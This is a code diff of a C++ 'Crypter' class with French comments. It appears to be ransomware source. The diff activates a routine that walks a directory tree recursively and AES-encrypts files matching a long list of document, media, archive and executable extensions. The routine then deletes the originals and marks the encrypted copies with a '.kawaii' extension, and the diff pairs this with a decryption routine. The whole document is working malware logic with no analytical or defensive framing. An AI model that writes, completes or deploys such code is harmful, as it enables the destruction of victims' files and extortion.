@@ -6,6 +6,7 @@
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <sstream>
 #include "AES_256.hpp"
 #include <filesystem>
 #include <utility>
@@ -13,6 +14,7 @@
 #include <cstdio>
 #include <cstdlib>
 #include <ctime>
+#include <algorithm>
 
 #define BUFFER_SIZE 1024*1024
 
@@ -35,7 +37,7 @@ Crypter::~Crypter() {
     clearMemory((void*)this->key_.data(), this->key_.size());
     clearMemory((void*)this->iv_.data(), this->iv_.size());
 }
-/*
+
 bool Crypter::isTargetExtension(const std::string& filePath) {
     std::vector<std::string> targetExtensions = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".zip", ".rar", ".exe", ".js", ".php", ".html", ".htm", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi", ".log", ".xml", ".csv", ".dat",".bin"};
 
@@ -47,66 +49,9 @@ bool Crypter::isTargetExtension(const std::string& filePath) {
     }
     return false;
 }
-*/
-void Crypter::decrypt(char *key_init, char *input_file, char *output_file) {
-    ByteArray key, dec;
-    size_t file_len;
 
-    FILE *input, *output;
-
-    srand(time(0));
-
-
-
-    size_t key_len = 0;
-    while(key_init[key_len] != 0)
-        key.push_back(key_init[key_len++]);
-
-    input = fopen(input_file, "rb");
-    if (input == 0) {
-        fprintf(stderr, "Cannot read file '%s'\n", input_file);
-        exit(1);
-    }
-
-    output = fopen(output_file, "wb");
-    if (output == 0) {
-        fprintf(stderr, "Cannot write file '%s'\n", output_file);
-        exit(1);
-    }
-
-    AES_256 aes(key);
-
-    fseeko64(input, 0, SEEK_END);
-    file_len = ftell(input);
-    fseeko64(input, 0, SEEK_SET);
-    printf("File is %zd bytes\n", file_len);
-    if(file_len >1) {
-
-        aes.decrypt_start(file_len);
-
-        while (!feof(input)) {
-            unsigned char buffer[BUFFER_SIZE];
-            size_t buffer_len;
-
-            buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
-            printf("Read %zd bytes\n", buffer_len);
-            if (buffer_len > 0) {
-                dec.clear();
-                aes.decrypt_continue(buffer, buffer_len, dec);
-                 fwrite(dec.data(), dec.size(), 1, output);
-            }
-        }
-
-        dec.clear();
-        aes.decrypt_end(dec);
-        fwrite(dec.data(), dec.size(), 1, output);
-
-        fclose(input);
-        fclose(output);
-    }
-
-
-    /* for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
+void Crypter::encrypt() {
+     for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
          if (fs::is_regular_file(entry.path())) {
              std::string filePath = entry.path().string();
 
@@ -120,73 +65,11 @@ void Crypter::decrypt(char *key_init, char *input_file, char *output_file) {
                  fs::remove(filePath); // Supprimer le fichier original
              }
          }
-     }*/
+     }
 }
 
-void Crypter::encrypt(char* key_init , char* input_file , char* output_file) {
-    ByteArray key, enc;
-    size_t file_len;
-
-    FILE *input, *output;
-
-    srand(time(0));
-
-
-
-    size_t key_len = 0;
-    while(key_init[key_len] != 0)
-        key.push_back(key_init[key_len++]);
-
-    input = fopen(input_file, "rb");
-    if (input == 0) {
-        fprintf(stderr, "Cannot read file '%s'\n", input_file);
-        exit(1);
-    }
-
-    output = fopen(output_file, "wb");
-    if (output == 0) {
-        fprintf(stderr, "Cannot write file '%s'\n", output_file);
-        exit(1);
-    }
-
-    AES_256 aes(key);
-
-    fseeko64(input, 0, SEEK_END);
-    file_len = ftell(input);
-    fseeko64(input, 0, SEEK_SET);
-    printf("File is %zd bytes\n", file_len);
-    if(file_len > 1 ) {
-
-        enc.clear();
-        aes.encrypt_start(file_len, enc);
-        fwrite(enc.data(), enc.size(), 1, output);
-
-        while (!feof(input)) {
-            unsigned char buffer[BUFFER_SIZE];
-            size_t buffer_len;
-
-            buffer_len = fread(buffer, 1, BUFFER_SIZE, input);
-            printf("Read %zd bytes\n", buffer_len);
-            if (buffer_len > 0) {
-                enc.clear();
-                aes.encrypt_continue(buffer, buffer_len, enc);
-                fwrite(enc.data(), enc.size(), 1, output);
-            }
-        }
-
-        enc.clear();
-        aes.encrypt_end(enc);
-        fwrite(enc.data(), enc.size(), 1, output);
-
-        fclose(input);
-        fclose(output);
-    }
-
-
-
-
-
-    /* for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
+void Crypter::decrypt() {
+     for (const auto& entry : fs::recursive_directory_iterator(this->directoryPath_)) {
          if (fs::is_regular_file(entry.path())) {
              std::string filePath = entry.path().string();
              if (fs::path(filePath).extension() == ".kawaii") { // Vérifier si l'extension est ".kawaii"
@@ -204,9 +87,9 @@ void Crypter::encrypt(char* key_init , char* input_file , char* output_file) {
                  fs::rename(decryptedFilePath, decryptedFilePath.substr(0, decryptedFilePath.size()-originalExtension.size()) + originalExtension);
              }
          }
-     }*/
+     }
 }
-/*
+
 std::string Crypter::readFromFile(const std::string &filePath) {
     std::ifstream file(filePath, std::ios::binary);
     std::string content;
@@ -221,34 +104,88 @@ std::string Crypter::readFromFile(const std::string &filePath) {
     return content;
 }
 
-std::string Crypter::encryptAES(const std::string &input) {
-    std::string encryptedText;
+std::string Crypter::encryptAES(const std::string &input_text) {
+    ByteArray key, enc;
+    size_t key_len = sizeof(this->key_);
 
-    try {
-        CryptoPP::AES::Encryption aesEncryption(reinterpret_cast<const CryptoPP::byte*>(this->key_.data()), 32);
-        CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, reinterpret_cast<const CryptoPP::byte*>(this->iv_.data()));
+    // Convert key_init to ByteArray
+    for (size_t i = 0; i < key_len; ++i)
+        key.push_back(this->key_[i]);
 
-        CryptoPP::StringSource(input, true, new CryptoPP::StreamTransformationFilter(cbcEncryption, new CryptoPP::StringSink(encryptedText)));
-    } catch (const CryptoPP::Exception& e) {
-        std::cerr << "Erreur lors du chiffrement : " << e.what() << std::endl;
+    std::stringstream input(input_text);
+    std::stringstream output;
+
+    AES_256 aes(key);
+
+    size_t file_len = input_text.size();
+   // std::cout << "File is " << file_len << " bytes\n";
+
+    if (file_len > 0) {
+        enc.clear();
+        aes.encrypt_start(file_len, enc);
+        output.write(reinterpret_cast<const char*>(enc.data()), enc.size());
+
+        while (!input.eof()) {
+            unsigned char buffer[BUFFER_SIZE];
+            size_t buffer_len;
+
+            input.read(reinterpret_cast<char*>(buffer), BUFFER_SIZE);
+            buffer_len = input.gcount();
+
+            if (buffer_len > 0) {
+                enc.clear();
+                aes.encrypt_continue(buffer, buffer_len, enc);
+                output.write(reinterpret_cast<const char*>(enc.data()), enc.size());
+            }
+        }
+
+        enc.clear();
+        aes.encrypt_end(enc);
+        output.write(reinterpret_cast<const char*>(enc.data()), enc.size());
     }
 
-    return encryptedText;
-}
-
+    return output.str();
+    }
 std::string Crypter::decryptAES(const std::string &encryptedText) {
-    std::string decryptedText;
+    ByteArray key, dec;
+    size_t key_len = sizeof(this->key_);
 
-    try {
-        CryptoPP::AES::Decryption aesDecryption(reinterpret_cast<const CryptoPP::byte*>(this->key_.data()), 32);
-        CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, reinterpret_cast<const CryptoPP::byte*>(this->iv_.data()));
+    // Convert key_init to ByteArray
+    for (size_t i = 0; i < key_len; ++i)
+        key.push_back(this->key_[i]);
 
-        CryptoPP::StringSource(encryptedText, true, new CryptoPP::StreamTransformationFilter(cbcDecryption, new CryptoPP::StringSink(decryptedText)));
-    } catch (const CryptoPP::Exception& e) {
-        std::cerr << "Erreur lors du déchiffrement : " << e.what() << std::endl;
+    std::stringstream input(encryptedText);
+    std::stringstream output;
+
+    AES_256 aes(key);
+
+    size_t file_len = encryptedText.size();
+    //std::cout << "File is " << file_len << " bytes\n";
+
+    if (file_len > 0) {
+        aes.decrypt_start(file_len);
+
+        while (!input.eof()) {
+            unsigned char buffer[BUFFER_SIZE];
+            size_t buffer_len;
+
+            input.read(reinterpret_cast<char*>(buffer), BUFFER_SIZE);
+            buffer_len = input.gcount();
+
+            if (buffer_len > 0) {
+                dec.clear();
+                aes.decrypt_continue(buffer, buffer_len, dec);
+                output.write(reinterpret_cast<const char*>(dec.data()), dec.size());
+            }
+        }
+
+        dec.clear();
+        aes.decrypt_end(dec);
+        output.write(reinterpret_cast<const char*>(dec.data()), dec.size());
     }
 
-    return decryptedText;
+    return output.str();
+
 }
 
 void Crypter::writeToFile(const std::string &filePath, const std::string &content) {
@@ -259,4 +196,4 @@ void Crypter::writeToFile(const std::string &filePath, const std::string &conten
     } else {
         std::cerr << "Impossible d'écrire dans le fichier : " << filePath << std::endl;
     }
-}*/
+}
